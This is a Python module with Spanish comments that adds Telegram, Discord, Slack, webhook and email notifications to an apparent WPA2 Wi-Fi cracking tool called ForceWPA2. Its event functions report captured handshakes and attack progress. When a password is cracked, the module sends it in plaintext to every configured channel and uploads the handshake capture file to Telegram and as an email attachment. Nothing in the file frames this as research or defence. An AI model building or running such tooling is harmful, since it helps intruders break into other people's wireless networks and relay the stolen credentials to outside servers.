#!/usr/bin/env python3
"""
Sistema de notificaciones: Telegram, Discord, Webhooks, Slack
"""

import requests
import json
import asyncio
from typing import Optional, Dict, Any

class NotificationManager:
    def __init__(self, config_file="notifications_config.json"):
        self.config = self.load_config(config_file)
        self.webhook_queue = []
    
    def load_config(self, config_file):
        """Carga configuración de notificaciones"""
        default_config = {
            "telegram": {
                "enabled": False,
                "bot_token": "",
                "chat_ids": []
            },
            "discord": {
                "enabled": False,
                "webhook_urls": []
            },
            "slack": {
                "enabled": False,
                "webhook_url": ""
            },
            "custom_webhooks": [],
            "email": {
                "enabled": False,
                "smtp_server": "smtp.gmail.com",
                "smtp_port": 587,
                "username": "",
                "password": "",
                "recipients": []
            }
        }
        
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                # Merge con default
                for key in default_config:
                    if key not in config:
                        config[key] = default_config[key]
                return config
        except:
            return default_config
    
    def save_config(self):
        """Guarda configuración"""
        with open("notifications_config.json", 'w') as f:
            json.dump(self.config, f, indent=2)
    
    # ---------- TELEGRAM ----------
    async def send_telegram(self, message: str, parse_mode='HTML'):
        """Envía mensaje por Telegram"""
        if not self.config['telegram']['enabled']:
            return False
        
        bot_token = self.config['telegram']['bot_token']
        chat_ids = self.config['telegram']['chat_ids']
        
        for chat_id in chat_ids:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': parse_mode
            }
            
            try:
                response = requests.post(url, json=data, timeout=5)
                if response.status_code != 200:
                    print(f"[Telegram] Error: {response.text}")
            except Exception as e:
                print(f"[Telegram] Exception: {e}")
        
        return True
    
    async def send_telegram_photo(self, photo_path: str, caption: str = ""):
        """Envía foto por Telegram (para capturas de handshake)"""
        if not self.config['telegram']['enabled']:
            return False
        
        bot_token = self.config['telegram']['bot_token']
        chat_ids = self.config['telegram']['chat_ids']
        
        for chat_id in chat_ids:
            url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
            
            try:
                with open(photo_path, 'rb') as photo:
                    files = {'photo': photo}
                    data = {'chat_id': chat_id, 'caption': caption}
                    response = requests.post(url, files=files, data=data, timeout=10)
            except Exception as e:
                print(f"[Telegram] Exception enviando foto: {e}")
        
        return True
    
    async def send_telegram_document(self, file_path: str, caption: str = ""):
        """Envía documento por Telegram (handshake.cap)"""
        if not self.config['telegram']['enabled']:
            return False
        
        bot_token = self.config['telegram']['bot_token']
        chat_ids = self.config['telegram']['chat_ids']
        
        for chat_id in chat_ids:
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            
            try:
                with open(file_path, 'rb') as doc:
                    files = {'document': doc}
                    data = {'chat_id': chat_id, 'caption': caption}
                    response = requests.post(url, files=files, data=data, timeout=10)
            except Exception as e:
                print(f"[Telegram] Exception enviando documento: {e}")
        
        return True
    
    # ---------- DISCORD ----------
    async def send_discord(self, message: str, title: str = None, color: int = 0x00ff00):
        """Envía mensaje por Discord webhook"""
        if not self.config['discord']['enabled']:
            return False
        
        embed = {
            "title": title or "ForceWPA2 Notification",
            "description": message,
            "color": color,
            "timestamp": self._get_timestamp()
        }
        
        payload = {"embeds": [embed]}
        
        for webhook_url in self.config['discord']['webhook_urls']:
            try:
                response = requests.post(webhook_url, json=payload, timeout=5)
                if response.status_code != 204:
                    print(f"[Discord] Error: {response.text}")
            except Exception as e:
                print(f"[Discord] Exception: {e}")
        
        return True
    
    # ---------- SLACK ----------
    async def send_slack(self, message: str, channel: str = None):
        """Envía mensaje por Slack"""
        if not self.config['slack']['enabled']:
            return False
        
        payload = {
            "text": message,
            "channel": channel or "#general"
        }
        
        webhook_url = self.config['slack']['webhook_url']
        
        try:
            response = requests.post(webhook_url, json=payload, timeout=5)
            return response.status_code == 200
        except Exception as e:
            print(f"[Slack] Exception: {e}")
            return False
    
    # ---------- CUSTOM WEBHOOKS ----------
    async def send_custom_webhook(self, webhook_url: str, data: Dict[str, Any]):
        """Envía a webhook personalizado"""
        try:
            response = requests.post(webhook_url, json=data, timeout=5)
            return response.status_code == 200
        except Exception as e:
            print(f"[Webhook] Exception: {e}")
            return False
    
    # ---------- EMAIL ----------
    async def send_email(self, subject: str, body: str, attachments: list = None):
        """Envía email con resultados"""
        if not self.config['email']['enabled']:
            return False
        
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        from email import encoders
        
        msg = MIMEMultipart()
        msg['From'] = self.config['email']['username']
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        
        # Adjuntar archivos
        if attachments:
            for file_path in attachments:
                try:
                    with open(file_path, 'rb') as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f'attachment; filename={file_path.split("/")[-1]}')
                        msg.attach(part)
                except:
                    pass
        
        try:
            server = smtplib.SMTP(self.config['email']['smtp_server'], self.config['email']['smtp_port'])
            server.starttls()
            server.login(self.config['email']['username'], self.config['email']['password'])
            
            for recipient in self.config['email']['recipients']:
                msg['To'] = recipient
                server.send_message(msg)
            
            server.quit()
            return True
        except Exception as e:
            print(f"[Email] Exception: {e}")
            return False
    
    # ---------- NOTIFICACIONES DE EVENTOS ----------
    async def notify_handshake_captured(self, bssid: str, essid: str, handshake_file: str):
        """Notifica captura de handshake"""
        message = f"""
🎯 <b>Handshake Capturado!</b>

<b>Red:</b> {essid}
<b>BSSID:</b> {bssid}
<b>Archivo:</b> {handshake_file}
<b>Estado:</b> ✅ Listo para crackear
        """
        
        # Enviar a todos los canales habilitados
        await self.send_telegram(message)
        await self.send_discord(message, title="Handshake Captured", color=0x00ff00)
        await self.send_slack(message)
    
    async def notify_password_found(self, bssid: str, essid: str, password: str, method: str):
        """Notifica contraseña encontrada"""
        message = f"""
🔓 <b>¡CONTRASEÑA ENCONTRADA!</b>

<b>Red:</b> {essid}
<b>BSSID:</b> {bssid}
<b>Contraseña:</b> <code>{password}</code>
<b>Método:</b> {method}
<b>Tiempo:</b> {self._get_timestamp()}
        """
        
        await self.send_telegram(message)
        await self.send_telegram_document(f"/tmp/handshake_{bssid.replace(':', '')}-01.cap", 
                                          f"Handshake para {essid}")
        await self.send_discord(message, title="✅ PASSWORD FOUND", color=0x00ff00)
        await self.send_slack(message)
        
        # Email con archivos adjuntos
        await self.send_email(
            subject=f"[ForceWPA2] Password found for {essid}",
            body=f"Password: {password}\nBSSID: {bssid}\nMethod: {method}",
            attachments=[f"/tmp/handshake_{bssid.replace(':', '')}-01.cap"]
        )
    
    async def notify_attack_progress(self, bssid: str, essid: str, progress: int, status: str):
        """Notifica progreso del ataque"""
        if progress % 25 == 0:  # Solo cada 25%
            message = f"""
⏳ <b>Progreso del ataque</b>

<b>Red:</b> {essid}
<b>Progreso:</b> {progress}%
<b>Estado:</b> {status}
            """
            await self.send_telegram(message)
    
    async def notify_error(self, error_msg: str, bssid: str = None):
        """Notifica errores críticos"""
        message = f"""
⚠️ <b>Error en ForceWPA2</b>

<b>Error:</b> {error_msg}
<b>BSSID:</b> {bssid or "N/A"}
<b>Timestamp:</b> {self._get_timestamp()}
        """
        await self.send_telegram(message)
        await self.send_discord(message, title="⚠️ Error", color=0xff0000)
    
    def _get_timestamp(self):
        from datetime import datetime
        return datetime.now().isoformat()

# ---------- CONFIGURACIÓN GUI ----------
def setup_notifications_interactive():
    """Configuración interactiva de notificaciones"""
    print("\n" + "="*50)
    print("📱 CONFIGURACIÓN DE NOTIFICACIONES")
    print("="*50)
    
    config = {}
    
    # Telegram
    print("\n🤖 Telegram")
    enable_telegram = input("¿Habilitar Telegram? (y/n): ").lower() == 'y'
    if enable_telegram:
        bot_token = input("Bot Token: ")
        chat_ids = input("Chat IDs (separados por coma): ").split(',')
        config['telegram'] = {
            'enabled': True,
            'bot_token': bot_token,
            'chat_ids': [cid.strip() for cid in chat_ids]
        }
    
    # Discord
    print("\n💬 Discord")
    enable_discord = input("¿Habilitar Discord? (y/n): ").lower() == 'y'
    if enable_discord:
        webhooks = input("Webhook URLs (separadas por coma): ").split(',')
        config['discord'] = {
            'enabled': True,
            'webhook_urls': [url.strip() for url in webhooks]
        }
    
    # Email
    print("\n📧 Email")
    enable_email = input("¿Habilitar Email? (y/n): ").lower() == 'y'
    if enable_email:
        config['email'] = {
            'enabled': True,
            'smtp_server': input("SMTP Server [smtp.gmail.com]: ") or "smtp.gmail.com",
            'smtp_port': int(input("SMTP Port [587]: ") or 587),
            'username': input("Username: "),
            'password': input("Password: "),
            'recipients': input("Recipients (separados por coma): ").split(',')
        }
    
    # Guardar configuración
    with open('notifications_config.json', 'w') as f:
        json.dump(config, f, indent=2)
    
    print("\n✅ Configuración guardada en notifications_config.json")

if __name__ == "__main__":
    setup_notifications_interactive()
